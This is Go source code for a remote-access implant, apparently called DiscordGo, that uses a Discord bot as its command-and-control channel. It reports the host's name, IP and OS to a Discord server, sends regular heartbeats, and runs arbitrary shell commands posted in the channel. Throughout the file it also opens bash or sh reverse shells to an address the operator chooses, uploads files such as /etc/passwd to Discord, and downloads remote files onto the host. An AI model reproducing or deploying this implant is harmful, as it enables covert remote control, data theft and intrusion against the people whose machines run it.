package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"

	"DiscordGo/pkg/agent"
	"DiscordGo/pkg/util"

	"github.com/bwmarrin/discordgo"
)

var newAgent *agent.Agent
var channelID *discordgo.Channel

// Create an Agent with all the necessary information
func init() {

	newAgent = &agent.Agent{}
	newAgent.HostName, _ = os.Hostname()
	newAgent.IP = agent.GetLocalIP()

	sys := "Unknown"
	if runtime.GOOS == "windows" {
		sys = "Windows"
	} else if runtime.GOOS == "linux" {
		sys = "Linux"
	} else if runtime.GOOS == "darwin" {
		sys = "MacOS"
	}

	newAgent.OS = sys
}

func main() {
	// TODO Do a check on the constant and produce a good error
	dg, err := discordgo.New("Bot " + util.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	if agent.DEBUG {
		fmt.Println("New Agent Info")
		fmt.Println(newAgent.HostName)
		fmt.Println(newAgent.IP)
		fmt.Println(newAgent.OS)
		fmt.Println()
	}

	channelID, _ = dg.GuildChannelCreate(util.ServerID, newAgent.IP, 0)

	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
	dg.ChannelMessagePin(channelID.ID, message.ID)
	dg.AddHandler(messageCreater)

	go func(dg *discordgo.Session) {
		ticker := time.NewTicker(time.Duration(5) * time.Minute)
		for {
			<-ticker.C
			go heartBeat(dg)
		}
	}(dg)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		return
	}

	if agent.DEBUG {
		fmt.Println("Agent is now running.  Press CTRL-C to exit.")
	}
	// Wait here until CTRL-C or other term signal is received.
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
	<-sc

	// Delete a channel
	dg.ChannelDelete(channelID.ID)

	// Cleanly close down the Discord session.
	dg.Close()

}

// This function is where we define custom commands for discordgo and system commands for the target
func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
	var re = regexp.MustCompile(`(?m)<@&\d{18}>`)

	// Special case
	if message.Author.Bot {
		if message.Content == "kill" {
			dg.ChannelDelete(channelID.ID)
			os.Exit(0)
		}
	}

	// Another special case
	if len(message.MentionRoles) > 0 {
		message_content := strings.Trim(re.ReplaceAllString(message.Content, ""), " ")
		// PUT THIS IS A FUNCTION\
		if message.ChannelID == channelID.ID {
			fmt.Println(message_content)
			output := executeCommand(message_content)
			if output == "" {
				dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
			} else {
				batch := ""
				counter := 0
				largeOutputChunck := []string{}
				for char := 0; char < len(output); char++ {
					if counter < 2000 && char < len(output)-1 {
						batch += string(output[char])
						counter++
					} else {
						if char == len(output)-1 {
							batch += string(output[char])
						}
						largeOutputChunck = append(largeOutputChunck, batch)
						batch = string(output[char])
						counter = 1
					}
				}

				for _, chunck := range largeOutputChunck {
					dg.ChannelMessageSend(message.ChannelID, "```"+chunck+"```")
				}
			}
		}
	}

	if !message.Author.Bot {
		if message.ChannelID == channelID.ID {
			if message.Content == "ping" {
				dg.ChannelMessageSend(message.ChannelID, "I'm alive bruv")
			} else if message.Content == "kill" {
				dg.ChannelDelete(channelID.ID)
				os.Exit(0)
			} else if strings.HasPrefix(message.Content, "cd") {
				commandBreakdown := strings.Fields(message.Content)
				os.Chdir(commandBreakdown[1])
				dg.ChannelMessageSend(message.ChannelID, "```Directory changed to "+commandBreakdown[1]+"```")
			} else if strings.HasPrefix(message.Content, "shell") {
				splitCommand := strings.Fields(message.Content)
				if len(splitCommand) == 1 {
					dg.ChannelMessageSend(message.ChannelID, "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell sh 127.0.0.1 69696\n Shell type: bash and sh```")
				} else if len(splitCommand) == 4 {
					shelltype := splitCommand[1]
					if shelltype == "bash" {
						hhh := splitCommand[2] + ":" + splitCommand[3]
						conn, _ := net.Dial("tcp", hhh)
						if conn == nil {
							return
						}

						sh := exec.Command("/bin/bash")
						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
						sh.Run()
						conn.Close()

					} else if shelltype == "sh" {
						hhh := splitCommand[2] + ":" + splitCommand[3]
						conn, _ := net.Dial("tcp", hhh)
						if conn == nil {
							println("please don't crash")
							return
						}

						sh := exec.Command("/bin/sh")
						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
						sh.Run()
						conn.Close()

					} else {
						dg.ChannelMessageSend(message.ChannelID, "```Not a supported shell type```")
					}
				} else {
					dg.ChannelMessageSend(message.ChannelID, "``` Incomplete command ```")
				}
			} else if strings.HasPrefix(message.Content, "download") {
				commandBreakdown := strings.Fields(message.Content)
				if len(commandBreakdown) == 1 {
					dg.ChannelMessageSend(message.ChannelID, "Please specify file(s): download /etc/passwd")
					return
				} else {
					files := commandBreakdown[1:]
					for _, file := range files {
						fileReader, err := os.Open(file)
						if err != nil {
							dg.ChannelMessageSend(message.ChannelID, "Could not open file: "+file)
						}
						dg.ChannelFileSend(message.ChannelID, file, bufio.NewReader(fileReader))
					}
				}
			} else if strings.HasPrefix(message.Content, "upload") {
				commandBreakdown := strings.Split(message.Content, " ")
				if len(commandBreakdown) == 1 {
					dg.ChannelMessageSend(message.ChannelID, "Please specify the file: upload /etc/ssh/sshd_config(with attached file) or upload http://example.com/test.txt /tmp/test.txt")
					return
				} else if len(commandBreakdown) == 2 { // upload /etc/ssh/sshd_config(with attached file)
					fileDownloadPath := commandBreakdown[1]
					if len(message.Attachments) == 0 { // With out this, the program will crash, can be used for debugging
						dg.ChannelMessageSend(message.ChannelID, "No file was attached!")
						return
					}
					util.DownloadFile(fileDownloadPath, message.Attachments[0].URL)
				} else { // upload http://example.com/test.txt /tmp/test.txt
					util.DownloadFile(commandBreakdown[2], commandBreakdown[1])
				}
			} else {
				output := executeCommand(message.Content)
				if output == "" {
					dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
				} else {
					batch := ""
					counter := 0
					largeOutputChunck := []string{}
					for char := 0; char < len(output); char++ {
						if counter < 2000 && char < len(output)-1 {
							batch += string(output[char])
							counter++
						} else {
							if char == len(output)-1 {
								batch += string(output[char])
							}
							largeOutputChunck = append(largeOutputChunck, batch)
							batch = string(output[char])
							counter = 1
						}
					}

					for _, chunck := range largeOutputChunck {
						dg.ChannelMessageSend(message.ChannelID, "```"+chunck+"```")
					}
				}
			}
		}
	}
}

func heartBeat(dg *discordgo.Session) {
	dg.ChannelMessageSend(channelID.ID, fmt.Sprintf("!heartbeat %v", newAgent.IP))
}

func executeCommand(command string) string {
	args := ""
	result := ""
	var shell, flag string
	var testcmd = command

	if runtime.GOOS == "windows" {
		shell = "cmd"
		flag = "/c"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}

	// Seperate args from command
	ss := strings.Split(command, " ")
	command = ss[0]

	if len(ss) > 1 {
		for i := 1; i < len(ss); i++ {
			args += ss[i] + " "
		}
		args = args[:len(args)-1] // I HATEEEEEEEE GOLANGGGGGG
	}

	if args == "" {
		output, err := exec.Command(shell, flag, command).Output()
		// output, err := exec.Command(command).Output()

		if err != nil {
			// maybe send error to server
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}

		result = string(output)
		if agent.DEBUG {
			fmt.Println("Result: " + result)
			fmt.Println(len(result))
		}

	} else {
		output, err := exec.Command(shell, flag, testcmd).Output()
		if err != nil {
			// maybe send error to server ??? nah
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}

		result = string(output)
		if agent.DEBUG {
			fmt.Println("Result: " + result)
			fmt.Println(len(result))
		}
	}
	return result
}
